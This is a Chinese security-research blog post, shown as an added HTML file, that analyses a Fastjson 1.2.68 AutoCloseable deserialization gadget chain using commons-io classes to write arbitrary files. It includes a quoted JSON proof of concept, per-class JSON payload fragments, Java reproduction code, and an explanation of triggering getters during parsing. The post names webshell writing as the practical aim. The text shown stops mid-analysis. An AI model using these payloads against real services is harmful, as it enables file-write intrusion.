@@ -1,0 +1,875 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Fastjson 68 commons-io AutoCloseable  | 素十八</title>
+<meta name="description" content="你救赎的人 终将成为你的光" />
+<link rel="shortcut icon" href="https://su18.org/favicon.ico?v=1749017091939">
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link rel="stylesheet" href="https://su18.org/styles/main.css">
+
+<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-154954923-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-154954923-1');
+</script>
+
+
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://su18.org">
+  <img class="avatar" src="https://su18.org/images/avatar.png?v=1749017091939" alt="">
+  </a>
+  <h1 class="site-title">
+    素十八
+  </h1>
+  <p class="site-description">
+    你救赎的人 终将成为你的光
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="http://javasec.org" class="menu" target="_blank">
+          Javasec
+        </a>
+      
+    
+      
+        <a href="https://www.downly.cn/" class="menu" target="_blank">
+          Downly
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+        <a href="https://github.com/su18" target="_blank">
+          <i class="fab fa-github"></i>
+        </a>
+      
+    
+      
+        <a href="https://twitter.com/K_MnO4_" target="_blank">
+          <i class="fab fa-twitter"></i>
+        </a>
+      
+    
+      
+        <a href="https://weibo.com/u/1945525883" target="_blank">
+          <i class="fab fa-weibo"></i>
+        </a>
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              Fastjson 68 commons-io AutoCloseable 
+            </h2>
+            <div class="post-info">
+              <span>
+                2021-05-27
+              </span>
+              <span>
+                31 min read
+              </span>
+              
+                <a href="https://su18.org/tag/J9zfIgD5go/" class="post-tag">
+                  # java
+                </a>
+              
+                <a href="https://su18.org/tag/5oAmhd4uF/" class="post-tag">
+                  # fastjson
+                </a>
+              
+            </div>
+            
+              <img class="post-feature-image" src="https://su18.org/post-images/fastjson-1.2.68.jpeg" alt="">
+            
+            <div class="post-content-wrapper">
+              <div class="post-content">
+                <h1 id="前言">前言</h1>
+<p>今天长亭公众号发了一个 fastjson commons-io AutoCloseable 的利用，正好我最近也在分析这个，看了一下，有相同的地方也有不同地方，那我也发出来一起学习交流吧。</p>
+<p>我这是测试使用的是  commons-io 2.4 ，fastjson 1.2.68 ，对于不同版本，可能有细节不同，请自测。</p>
+<h1 id="前置知识">前置知识</h1>
+<p>在 Fastjson 1.2.68 版本上，由浅蓝师傅挖提出了使用 expectClass 中的 AutoCloseable 进行文件读写操作的思路：“IntputStream 和 OutputStream 都是实现自 AutoCloseable 接口的，而且也没有被列入黑名单，所以只要找到合适的类，还是可以进行文件读写等高危操作的。”</p>
+<p>由此 fastjson 漏洞利用思路从命令执行、JNDI 转为了写文件，在实战情况下，还是可以写入 webshell 拿到权限，因此这个思路成为了 68 版本之后 fastjson 中挖掘漏洞的新思路。</p>
+<p>由于 fastjson 漏洞触发方式是调用 get/set/构造方法触发漏洞，因此对于写文件一类的操作，根据浅蓝师傅的文章，需要以下几个条件：</p>
+<ul>
+<li>需要一个通过 set 方法或构造方法指定文件路径的 OutputStream。</li>
+<li>需要一个通过 set 方法或构造方法传入字节数据的 OutputStream，参数类型必须是 <code>byte[]、ByteBuffer、String、char[]</code> 其中的一个，并且可以通过 set 方法或构造方法传入一个 OutputStream，最后可以通过 write 方法将传入的字节码 write 到传入的 OutputStream。</li>
+<li>需要一个通过 set 方法或构造方法传入一个 OutputStream，并且可以通过调用 toString、hashCode、get、set、构造方法 调用传入的 OutputStream 的 close、write 或 flush 方法。</li>
+</ul>
+<p>以上三个组合在一起就能构造成一个写文件的利用链。</p>
+<p>看一下师傅给的 poc：</p>
+<pre><code>{
+    &quot;stream&quot;: {
+        &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,
+        &quot;@type&quot;: &quot;org.eclipse.core.internal.localstore.SafeFileOutputStream&quot;,
+        &quot;targetPath&quot;: &quot;f:/test/pwn.txt&quot;,
+        &quot;tempPath&quot;: &quot;f:/test/test.txt&quot;
+    },
+    &quot;writer&quot;: {
+        &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,
+        &quot;@type&quot;: &quot;com.esotericsoftware.kryo.io.Output&quot;,
+        &quot;buffer&quot;: &quot;YjF1M3I=&quot;,
+        &quot;outputStream&quot;: {
+            &quot;$ref&quot;: &quot;$.stream&quot;
+        },
+        &quot;position&quot;: 5
+    },
+    &quot;close&quot;: {
+        &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,
+        &quot;@type&quot;: &quot;com.sleepycat.bind.serial.SerialOutput&quot;,
+        &quot;out&quot;: {
+            &quot;$ref&quot;: &quot;$.writer&quot;
+        }
+    }
+}
+</code></pre>
+<p>我们来复现一下，成功写入文件：</p>
+<figure data-type="image" tabindex="1"><img src="https://su18.org/post-images/1621730162408.png" alt="" loading="lazy"></figure>
+<p>那么这个 payload 为什么能成功写入文件呢？主要有以下几个需要注意点：</p>
+<ul>
+<li>AutoCloseable 的接口可以绕过 checkAutoType。</li>
+<li>分别找到了不同的实现类来实现不同的功能：创建文件链接、写入内容、write/flush 等。</li>
+<li>使用了 fastjson 的 ref 进行对象引用，把这些类串联起来。</li>
+</ul>
+<p>AutoCloseable 为什么可以绕过 checkAutoType 这里不再重复，在我之前的文章也分析过。</p>
+<p>这里浅蓝找到了三个类分别实现了不同的功能：</p>
+<ul>
+<li><code>org.eclipse.core.internal.localstore.SafeFileOutputStream</code>：用来创建文件链接对象和OutputStream。</li>
+<li><code>com.esotericsoftware.kryo.io.Output</code>：用来向 OutputStream 中写入文件内容。</li>
+<li><code>com.sleepycat.bind.serial.SerialOutput</code>：用来触发 flush 方法将流写回文件中。</li>
+</ul>
+<p>首先来看 SafeFileOutputStream。</p>
+<figure data-type="image" tabindex="2"><img src="https://su18.org/post-images/1621732165602.png" alt="" loading="lazy"></figure>
+<p>这个类有一个两个参数的构造方法，接收参数 targetPath 和 tempPath。在构造方法里执行了如下操作：</p>
+<ol>
+<li>对 targetPath/tempPath 路径的文件创建 File 对象，并放在 <code>this.target/this.temp</code> 属性中，如果 tempPath 参数不存在，则使用 targetPath + “.bak” 作为文件路径</li>
+<li>将 targetPath 中的文件流拷贝入 tempPath 中。</li>
+<li>将流（BufferedOutputStream 对象）放入 <code>this.output</code>。</li>
+</ol>
+<p>也就是说，我们只需要传入一个文件路径，SafeFileOutputStream 就会替我们创建 OutputStream 对象并保存在 <code>this.output</code> 中。</p>
+<p>这是用到了 fastjson 的一个特性，在从 json 创建一个对象时，会使用 <code>JavaBeanInfo.getDefaultConstructor</code> 获取这个对象的无参构造方法，如果没有，则使用 <code>JavaBeanInfo.getCreatorConstructor</code> 会找到这个类的构造方法，并从 json 中寻找对应的参数，这些参数使用构造方法创建，不再使用 set 方法创建。相关原理看<a href="https://www.cnblogs.com/Raiden-xin/p/12681577.html">这篇文章</a>。这里构造方法的获取逻辑暂时略过，感兴趣的可以自行查看源码。</p>
+<p>也就是说，我们只需要构造 SafeFileOutputStream 类，并传入 targetPath/tempPath 两个参数，就会调用对应的构造方法了。</p>
+<p>第二个类是 <code>com.esotericsoftware.kryo.io.Output</code>，这也是个 OutputStream 的实现类，类中定义了一些属性，其中 buffer 是 <code>byte[]</code> 类型的属性，是要写入 OutputStream 中内容；position 是 int 类型，代表了写入的大小；outputStream 是</p>
+<figure data-type="image" tabindex="3"><img src="https://su18.org/post-images/1621738614390.png" alt="" loading="lazy"></figure>
+<p>Output 中有一个 <code>flush</code> 方法，调用 outputStream 对象的 write 和 flush 方法将内容输出到了文件中。</p>
+<figure data-type="image" tabindex="4"><img src="https://su18.org/post-images/1621739458531.png" alt="" loading="lazy"></figure>
+<p>也就是说，如果我们能想办法调用到 flush 方法，就可以写出文件了。那该如何触发呢？</p>
+<p>此时出现了第三个类，浅蓝师傅找到了 ObjectOutputStream 类，他有一个内部类 BlockDataOutputStream，在 ObjectOutputStream 有一个 OutputStream 参数的构造方法中创建。</p>
+<figure data-type="image" tabindex="5"><img src="https://su18.org/post-images/1621739929790.png" alt="" loading="lazy"></figure>
+<p>并调用了其 <code>setBlockDataMode</code> 方法，这个方法由调用了 drain 方法，然后调用了 OutputStream 对象的 write 方法写入了数据。这个 write 方法可以满足触发 flush 方法的调用。</p>
+<figure data-type="image" tabindex="6"><img src="https://su18.org/post-images/1621740073664.png" alt="" loading="lazy"></figure>
+<p>但是 ObjectOutputStream 有一个无参构造方法，fastjson 会优先获取这个构造方法，无法使用我们希望的构造方法去触发，由此浅蓝找了一个 ObjectOutputStream 的实现类来完成触发：<code>com.sleepycat.bind.serial.SerialOutput</code>。</p>
+<figure data-type="image" tabindex="7"><img src="https://su18.org/post-images/1621740788446.png" alt="" loading="lazy"></figure>
+<p>这个类有两个参数的构造方法，并且使用 <code>super(out)</code> 调用了 ObjectOutputStream 带参数的构造方法，可以触发文件的 flush 行为。</p>
+<p>因此，由上三个类串到一起就可以完成文件的写入，这之中利用了 fastjson 的另一个特性：对象引用。从 fastjson 1.2.36开始，可以通过 <code>$ref</code> 指定被引用的属性。</p>
+<p>JavaBeanDeserializer 支持 <code>$ref</code> 这种技巧，ThrowableDeserializer 不支持，后者没有<code>parseField()</code> 方法。</p>
+<p>fastjson 默认提供对象引用功能，在传输的数据中出现相同的对象时，fastjson 默认开启引用检测将相同的对象写成引用的形式，对应如下：</p>
+<table>
+<thead>
+<tr>
+<th>引用</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>&quot;$ref&quot;:&quot;..&quot;</code></td>
+<td>上一级</td>
+</tr>
+<tr>
+<td><code>&quot;$ref&quot;:&quot;@&quot;</code></td>
+<td>当前对象，也就是自引用</td>
+</tr>
+<tr>
+<td><code>&quot;$ref&quot;:&quot;$&quot;</code></td>
+<td>根对象</td>
+</tr>
+<tr>
+<td><code>&quot;$ref&quot;:&quot;$.children.0&quot;</code></td>
+<td>基于路径的引用，相当于 root.getChildren().get(0)</td>
+</tr>
+</tbody>
+</table>
+<p>具体的处理代码在 <code>JavaBeanDeserializer#deserialze</code> 方法中：</p>
+<figure data-type="image" tabindex="8"><img src="https://su18.org/post-images/1621743727936.png" alt="" loading="lazy"></figure>
+<p><a href="https://blog.0kami.cn/2020/04/13/java/talk-about-fastjson-deserialization/">这篇文章</a>有简单的介绍，这种特性最早由 threedr3am 师傅使用来<a href="https://github.com/threedr3am/learnjavabug/commit/ea61297cf7b2125ecae0064d2b8061a9e32db1e6">指定触发某些 getter 方法</a>。因为会经过取值-赋值的过程，这里我们使用  <code>$ref</code> 关键字不是为了触发方法，只是为了进行对象的引用和传递。</p>
+<p>有个这个特性，我们就可以在一次反序列化中使用 <code>$ref</code> 关键字进行引用的调用，完成 payload 的串联。</p>
+<p>如同浅蓝所说：“这三个库实际组合起来危害危害一般，本文旨在给安全研究者提供一种针对此漏洞的 gadget 挖掘思路，危害更高的 gadget 还要靠自己不断挖掘。”</p>
+<p>因此，想完成更落地的攻击方式，需要找到更常使用的库中的类。</p>
+<h1 id="payload-分析">PAYLOAD 分析</h1>
+<p>我拿到的 payload ，与浅蓝给出了 payload 思路类似，也是通过多个类实现不同的功能，然后进行组合串联，接下来分别分析一下。</p>
+<h2 id="charsequenceinputstream">CharSequenceInputStream</h2>
+<p><code>org.apache.commons.io.input.CharSequenceInputStream</code>：接收 CharSequence 内容并初始化</p>
+<figure data-type="image" tabindex="9"><img src="https://su18.org/post-images/1621824638958.png" alt="" loading="lazy"></figure>
+<p>这个类是 InputStream 的子类，构造方法接收参数 CharSequence 对象(s)、字符编码(charset)、字节大小(bufferSize)，并初始化放在类属性中。</p>
+<figure data-type="image" tabindex="10"><img src="https://su18.org/post-images/1621825318230.png" alt="" loading="lazy"></figure>
+<p>CharSequence 是 String 的父接口，我们使用 String 对象的数据即可。</p>
+<p>由于这个类接收 CharSequence 对象，可以充当我们写入文件内容的入口类。写入的内容会放在 <code>this.cbuf</code> 中，这是一个 CharBuffer 对象。</p>
+<p>使用如下 json 反序列化 CharSequenceInputStream 对象：</p>
+<pre><code class="language-json">{
+	&quot;charSequenceInputStream&quot;: {
+		&quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,
+		&quot;@type&quot;: &quot;org.apache.commons.io.input.CharSequenceInputStream&quot;,
+		&quot;charset&quot;: &quot;UTF-8&quot;,
+		&quot;bufferSize&quot;: 1,
+		&quot;s&quot;: {
+			&quot;@type&quot;: &quot;java.lang.String&quot;&quot;aaa&quot;
+		}
+	}
+</code></pre>
+<p>可以看到，参数 s 是 CharSequence 接口，我们使用了他的子类 String，可以看到上面这个 json 并非完全格式化的 json，为什么会写成这样呢？</p>
+<p>fastjson 为了解析的速度快，读取 token 时采取了基于预测的方式，也就是根据当前解析情况指定下一个 token 的期望字符。但是实际上的下一个字符串并不一定是期望字符，在不是的情况下，程序会调用无预期的 nextToken 方法进行解析，经过这个期望字符，程序就减少了 switch case 的次数，加快了解析速度。由于在无预期的 nextToken 方法中，将一些常出现的类型写在了外面，执行调用相关的 scanXXX 方法进行解析。因此，在某些写法中，可以以非常规的方式解析字符串。</p>
+<figure data-type="image" tabindex="11"><img src="https://su18.org/post-images/1622009054504.png" alt="" loading="lazy"></figure>
+<p>例如如下代码：在检测到 <code>@type</code> 之后，使用以 “:” 作为期望进行解析后面的字符串类型，并以 “,” 作为期望预测下一个 token。在经过了 checkAutoType 之后，会根据  <code>@type</code> 指定的类型分配反序列化器进行后续的处理。</p>
+<figure data-type="image" tabindex="12"><img src="https://su18.org/post-images/1621998657348.png" alt="" loading="lazy"></figure>
+<p>我们发现，在处理 String 类型的反序列化器 StringCodec 中，会继续读取字符串类型的 token，并返回结果。</p>
+<figure data-type="image" tabindex="13"><img src="https://su18.org/post-images/1622008148747.png" alt="" loading="lazy"></figure>
+<p>因此，我们在传递 <code>&quot;@type&quot;: &quot;java.lang.String&quot;&quot;aaa&quot;</code> 给 fastjson 处理时，就会返回相应的 aaa，省略了中间过渡字符 “,”</p>
+<p>这部分需要查看 fastjson 对于词法解析的代码实现及思想。</p>
+<h2 id="filewriterwithencoding">FileWriterWithEncoding</h2>
+<p><code>org.apache.commons.io.output.FileWriterWithEncoding</code>：根据文件路径创建 File 对象，并初始化 Writer 方法。</p>
+<figure data-type="image" tabindex="14"><img src="https://su18.org/post-images/1621819340853.png" alt="" loading="lazy"></figure>
+<p>这个类构造方法接收 file 参数、encoding 参数，创建 File 对象，并调用 initWriter 方法初始化 OutputStreamWriter 方法放在 <code>this.out</code> 中。</p>
+<figure data-type="image" tabindex="15"><img src="https://su18.org/post-images/1621818736594.png" alt="" loading="lazy"></figure>
+<p>使用如下 json 反序列化 writer 对象：</p>
+<pre><code class="language-json">{
+	&quot;writer&quot;: {
+		&quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,
+		&quot;@type&quot;: &quot;org.apache.commons.io.output.FileWriterWithEncoding&quot;,
+		&quot;file&quot;: &quot;/Users/phoebe/Downloads/1.txt&quot;,
+		&quot;encoding&quot;: &quot;UTF-8&quot;
+	}
+}
+</code></pre>
+<figure data-type="image" tabindex="16"><img src="https://su18.org/post-images/1621821506655.png" alt="" loading="lazy"></figure>
+<h2 id="writeroutputstream">WriterOutputStream</h2>
+<p><code>org.apache.commons.io.output.WriterOutputStream</code>：将 writer 引入到 OutputStream 属性中，</p>
+<p>WriterOutputStream 的构造方法接收参数 Writer(writer)、字符编码(charsetName)、字节大小(bufferSize)、标识是否立即写入的布尔型参数(writeImmediately)。</p>
+<figure data-type="image" tabindex="17"><img src="https://su18.org/post-images/1621822620845.png" alt="" loading="lazy"></figure>
+<p>然后将这些参数在 WriterOutputStream 初始化。</p>
+<figure data-type="image" tabindex="18"><img src="https://su18.org/post-images/1621822876272.png" alt="" loading="lazy"></figure>
+<p>WriterOutputStream 的 write 方法，会将接受到的 byte 数组通过  <code>this.decoderIn</code> 的 put 方法写入，使用 <code>this.processInput</code> 方法将 in 和 out 数据进行拷贝，并在 <code>this.flushOutput</code> 方法中调用 writer 的 write 方法写出 <code>this.decoderOut</code> 中的数据。</p>
+<figure data-type="image" tabindex="19"><img src="https://su18.org/post-images/1621846477956.png" alt="" loading="lazy"></figure>
+<p>我们不关心中间的调用过程，简单来说，WriterOutputStream 的 write 方法会调用 writer 将接受到的字节数据写出去。</p>
+<p>这里有个大坑，fastjson 在反序列化这个类时，在获取构造方法时，可能会获取到下面的两种其中的一个。</p>
+<figure data-type="image" tabindex="20"><img src="https://su18.org/post-images/1622082080266.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="21"><img src="https://su18.org/post-images/1622082091364.png" alt="" loading="lazy"></figure>
+<p>但是 CharsetDecoder 是一个抽象类，也没有继承 AutoCloseable 接口，所以我们无法使用 AutoType 进行创建，只能使用带有 charsetName 的构造方法创建。</p>
+<p>使用如下 json 反序列化 WriterOutputStream 对象：</p>
+<pre><code class="language-json">{
+	&quot;writerOutputStream&quot;: {
+		&quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,
+		&quot;@type&quot;: &quot;org.apache.commons.io.output.WriterOutputStream&quot;,
+		&quot;writeImmediately&quot;: true,
+		&quot;bufferSize&quot;: 1,
+		&quot;charsetName&quot;: &quot;UTF-8&quot;,
+		&quot;writer&quot;: {writer对象}
+	}
+}
+</code></pre>
+<p>现在我们有了接收输入（文件内容）的 InputStream，负责输出的 OutputStream 和 Writer（文件路径），接下来我们还需要找到将 InputStream 和 OutputStream 进行转换，以及触发写出文件操作。</p>
+<h2 id="teeinputstream">TeeInputStream</h2>
+<p><code>org.apache.commons.io.input.TeeInputStream</code>：接收 InputStream 及 OutputStream，并提供将 InputStream 中的字节写入  OutputStream 的功能，以及提供调用两者 close 的功能。</p>
+<figure data-type="image" tabindex="22"><img src="https://su18.org/post-images/1621842134579.png" alt="" loading="lazy"></figure>
+<p>TeeInputStream 是 FilterInputStream 的子类，会在构造方法中会把 InputStream 放在 <code>this.in</code> 中。</p>
+<p>TeeInputStream 的 <code>read</code> 方法会调用其父类 ProxyInputStream 的对应 read 方法读取 <code>this.in</code> 中的内容，并调用 <code>this.branch</code> 中的 OutputStream 对象的 write 方法进行写入。</p>
+<figure data-type="image" tabindex="23"><img src="https://su18.org/post-images/1621843282767.png" alt="" loading="lazy"></figure>
+<p>使用如下 json 反序列化 TeeInputStream 对象：</p>
+<pre><code class="language-json">{
+	&quot;teeInputStream&quot;: {
+		&quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,
+		&quot;@type&quot;: &quot;org.apache.commons.io.input.TeeInputStream&quot;,
+		&quot;input&quot;: {InputStream 对象},
+		&quot;branch&quot;: {OutputStream 对象},
+		&quot;closeBranch&quot;: true
+	}
+}
+</code></pre>
+<h2 id="bominputstream">BOMInputStream</h2>
+<p><code>org.apache.commons.io.input.BOMInputStream</code>：调用  InputStream 的 read 方法读取字节。</p>
+<p>这个类是 commons-io 用来检测文件输入流的 BOM 并在输入流中进行过滤，根据 <code>org.apache.commons.io.ByteOrderMark</code> 中的属性，BOMInputStream 支持识别以下几种 BOM。</p>
+<figure data-type="image" tabindex="24"><img src="https://su18.org/post-images/1621845072251.png" alt="" loading="lazy"></figure>
+<p>BOMInputStream 与 TeeInputStream 同继承了父类 ProxyInputStream，其初始化参数 delegate 接收 InputStream，使用父类构造方法放入 <code>this.in</code> 中，boms 是 ByteOrderMark 类的可变参数数组，用来指定不同编码的 BOM 头部，会处理成 List 对象存入 <code>this.boms</code> 中。</p>
+<figure data-type="image" tabindex="25"><img src="https://su18.org/post-images/1621846039279.png" alt="" loading="lazy"></figure>
+<p>ByteOrderMark 就是 commons-io 包对流中 BOM 头部的封装，这个类接收 charsetName 和名为 bytes 的可变参数 int 数组，这个 int 数组用来表示不同编码的字节顺序标记的表示：</p>
+<figure data-type="image" tabindex="26"><img src="https://su18.org/post-images/1621845252971.png" alt="" loading="lazy"></figure>
+<p>对应到百度百科中的表格：</p>
+<figure data-type="image" tabindex="27"><img src="https://su18.org/post-images/1621845862940.png" alt="" loading="lazy"></figure>
+<p>BOMInputStream 中存在一个 <code>getBOM()</code> 方法，这个方法原本的作用就是根据类初始化时传入的 InputStream 对象以及 ByteOrderMark 配置，在流中读取对应的 ByteOrderMark。</p>
+<figure data-type="image" tabindex="28"><img src="https://su18.org/post-images/1621853180761.png" alt="" loading="lazy"></figure>
+<p>这个方法创建了一个 for 循环，根据类初始化时的 ByteOrderMark 的 int 数组长度，调用 <code>this.in</code> 的 read 方法在流中循环读取相应长度的数据。</p>
+<p>使用如下 json 反序列化 BOMInputStream 对象：</p>
+<pre><code class="language-json">{
+	&quot;bOMInputStream&quot;: {
+		&quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,
+		&quot;@type&quot;: &quot;org.apache.commons.io.input.BOMInputStream&quot;,
+		&quot;delegate&quot;: {InputStream 对象},
+		&quot;boms&quot;: [{
+			&quot;charsetName&quot;: &quot;UTF-8&quot;,
+			&quot;bytes&quot;: [0, 0, 0, 0]
+		}]
+	}
+}
+</code></pre>
+<h2 id="getter-方法调用">GETTER 方法调用</h2>
+<p>这个 BOMInputStream 的 <code>getBOM</code> 方法就是触发这条 gadget 的方法，我们结合上面的全部分析一起看一下：</p>
+<ul>
+<li>BOMInputStream 初始化一个 TeeInputStream 和一个 ByteOrderMark 数组，里面存放了一个指定长度的 int 数组，用来读取相应长度的输入流；</li>
+<li>TeeInputStream 初始化了一个 CharSequenceInputStream 和 WriterOutputStream，无论调用 TeeInputStream 的任意一个 read 方法，都会将读取的内容同步调用 WriterOutputStream 的 write 方法写入其中；</li>
+<li>CharSequenceInputStream 初始化输入的字符串（实际上是 CharSequence 对象）、字符编码、以及缓冲区大小（最大 255）用于创建 InputStream 对象；</li>
+<li>WriterOutputStream 初始化 FileWriterWithEncoding 以及一些属性，WriterOutputStream 的 write 方法会将字节进行写入，如果参数 writeImmediately 为 true，会调用 OutputStreamWriter 的 write 方法进行写出。</li>
+</ul>
+<p>以上过程使用代码正向调用的话，过程如下，可成功创建文件：</p>
+<pre><code class="language-java">CharSequenceInputStream inputStream    = new CharSequenceInputStream(&quot;aaaa&quot;, &quot;UTF-8&quot;, 4);
+FileWriterWithEncoding  fileWriter     = new FileWriterWithEncoding(&quot;/Users/phoebe/Downloads/12.txt&quot;, &quot;UTF-8&quot;, false);
+WriterOutputStream      outputStream   = new WriterOutputStream(fileWriter, &quot;UTF-8&quot;, 4, true);
+TeeInputStream          teeInputStream = new TeeInputStream(inputStream, outputStream, true);
+ByteOrderMark           byteOrderMark  = new ByteOrderMark(&quot;UTF-8&quot;, new int[]{0, 0, 0, 0});
+BOMInputStream          bomInputStream = new BOMInputStream(teeInputStream, byteOrderMark);
+bomInputStream.getBOM();
+bomInputStream.close();
+</code></pre>
+<p>这当中各个类的初始化方法均可以使用 fastjson 来构造，那么问题来了，现在我们需要想办法触发 bomInputStream 对象的 <code>getBOM</code> 方法和 close 方法。</p>
+<p>在什么时候 fastjson 会调用类的 <code>getXXX</code> 方法呢？那就是序列化的时候，这里就用到了 Fastjson 的另一个特性，首先我们创建一个类用于测试。</p>
+<pre><code class="language-java">public class Person {
+
+	private String name;
+
+	private int _a_g_e_;
+
+	private String gender;
+
+	private HashMap&lt;?, ?&gt; map;
+
+	static {
+		System.out.println(&quot;static block called&quot;);
+	}
+
+	public Person() {
+		System.out.println(&quot;non-parameter constructor called&quot;);
+	}
+
+	public Person(String name, int age, String gender, HashMap&lt;?, ?&gt; map) {
+		System.out.println(&quot;constructor called&quot;);
+		this.name = name;
+		this._a_g_e_ = age;
+		this.gender = gender;
+		this.map = map;
+	}
+
+	public String getName() {
+		System.out.println(&quot;name getter called&quot;);
+		return name;
+	}
+
+	public String getA() {
+		System.out.println(&quot;Interesting Getter&quot;);
+		return &quot;s&quot;;
+	}
+
+	public void setName(String name) {
+		System.out.println(&quot;name setter called&quot;);
+		this.name = name;
+	}
+
+	public int getAge() {
+		System.out.println(&quot;age getter called&quot;);
+		return _a_g_e_;
+	}
+
+	public void setAge(int age) {
+		System.out.println(&quot;age setter called&quot;);
+		this._a_g_e_ = age;
+	}
+
+	public String setGender() {
+		System.out.println(&quot;gender setter called&quot;);
+		return gender;
+	}
+
+	public HashMap&lt;?, ?&gt; getMap() {
+		System.out.println(&quot;map getter called&quot;);
+		return map;
+	}
+
+	@Override
+	public String toString() {
+		return &quot;Person{&quot; +
+				&quot;name='&quot; + name + '\'' +
+				&quot;, age=&quot; + _a_g_e_ +
+				&quot;, gender='&quot; + gender + '\'' +
+				&quot;, map=&quot; + map +
+				'}';
+	}
+}
+</code></pre>
+<p>这个类部分属性有 getter 方法，部分属性没有，但是 getXXX 的 XXX 并不一定与属性变量名相同，还有一些 getter 方法不对应到类的属性，仅仅是以 getXXX 的方式命名，如果我们要对这个类进行序列化。结果会是什么样的呢？</p>
+<figure data-type="image" tabindex="29"><img src="https://su18.org/post-images/1621903480206.png" alt="" loading="lazy"></figure>
+<p>通过结果可以看到，fastjson 的序列化过程，其实与类的属性值无关， 他仅仅拿出了类中所有命名规则为 <code>getABC</code> 的方法，把 get 去掉并把 A 编程小写当做属性值，也就是说如果 <code>getABC</code> 如果返回了 <code>aaa</code> ，那对于 fastjson 来说，类中的属性 aBC 的值为 aaa（当然选取 getter 方法需要满足几个条件，在之前的文章说过，这里不再赘述）。在<a href="https://blog.csdn.net/xiaoye319/article/details/85164944">这篇博客</a>中博主对三个最常用的 json 处理框架进行了测试，得出了类似的结果。</p>
+<p>在上面的例子中，我们使用了 <code>JSON.toJSONString</code> 方法为对象创建序列化字符串，触发了类中的全部 <code>getXXX</code> 方法，那在实际的反序列化的过程中如何触发呢？</p>
+<p>答案是使用反序列化 Map 对象的特性。这里我们来跟一下 fastjson 的处理逻辑。在 <code>parseObject</code> 方法中，首先调用 <code>parse</code> 进行反序列化，然后调用 <code>JSON.toJSON()</code> 将 Java 对象转为 JSONObject 对象。</p>
+<figure data-type="image" tabindex="30"><img src="https://su18.org/post-images/1621909675309.png" alt="" loading="lazy"></figure>
+<p><code>toJSON</code> 方法中判断如果对象类型是 Map 对象时，将会调用 MapSerializer 的 <code>write</code> 方法获取 Map 中的键值对中的 value 的对象，并再次调用 <code>toJSON</code> 方法（递归自调用）。</p>
+<figure data-type="image" tabindex="31"><img src="https://su18.org/post-images/1621909773289.png" alt="" loading="lazy"></figure>
+<p>处理这个 value 对象时，会调用 <code>javaBeanSerializer.getFieldValuesMap</code> 方法获取对象中的属性值。</p>
+<figure data-type="image" tabindex="32"><img src="https://su18.org/post-images/1621909903762.png" alt="" loading="lazy"></figure>
+<p>这个方法调用 FieldSerializer 的 <code>getPropertyValue</code> 方法来获取属性值。</p>
+<figure data-type="image" tabindex="33"><img src="https://su18.org/post-images/1621909969466.png" alt="" loading="lazy"></figure>
+<p>调用 fieldInfo 的 <code>get</code> 方法获取获取属性值。</p>
+<figure data-type="image" tabindex="34"><img src="https://su18.org/post-images/1621910037260.png" alt="" loading="lazy"></figure>
+<p>这个方法通过反射调用对象 getter 方法获取值。</p>
+<figure data-type="image" tabindex="35"><img src="https://su18.org/post-images/1621910043462.png" alt="" loading="lazy"></figure>
+<p>这就正好满足了我们的调用链，将要反序列化的目标类放在 Map 对象的 value 中，让 fastjson 反序列化这个 map 对象，将会触发这个类的 <code>getter</code> 方法。</p>
+<figure data-type="image" tabindex="36"><img src="https://su18.org/post-images/1621907279167.png" alt="" loading="lazy"></figure>
+<p>在上面的分析中，我们使用了 <code>parseObject</code> 方法的调用解析，可以触发 getter，那如果使用 <code>parse</code>方法解析，还能触发吗？</p>
+<h2 id="parse-与-parseobject">parse 与 parseObject</h2>
+<p>这里需要注意的是，fastjson 中的 <code>parse</code> 和 <code>parseObject</code> 方法都可以用来将 json 字符串反序列化成 Java 对象，<code>parseObject</code> 本质上也是调用 <code>parse</code> 进行反序列化的。但是 <code>parseObject</code> 会额外的将 Java 对象转为 JSONObject 对象，即 <code>JSON.toJSON()</code>。所以进行反序列化时的细节区别在于，<code>parse</code> 会识别并调用目标类的 setter 方法及某些特定条件的 getter 方法，而 <code>parseObject</code> 由于多执行了 <code>JSON.toJSON(obj)</code>，所以在处理过程中会调用反序列化目标类的所有 <code>setter</code> 和 <code>getter</code> 方法。</p>
+<p>因此，如果想要同时兼容 <code>parse</code> 和 <code>parseObject</code> 方法，就要找到一种方法可以让其在反序列化过程中调用到 <code>JSON.toString</code> 方法。</p>
+<p>在 fastjson 的反序列化过程中，会使用不同的处理器负责不同类型（class）的反序列化流程。在 <code>ParserConfig.initDeserializers()</code> 方法中定义。</p>
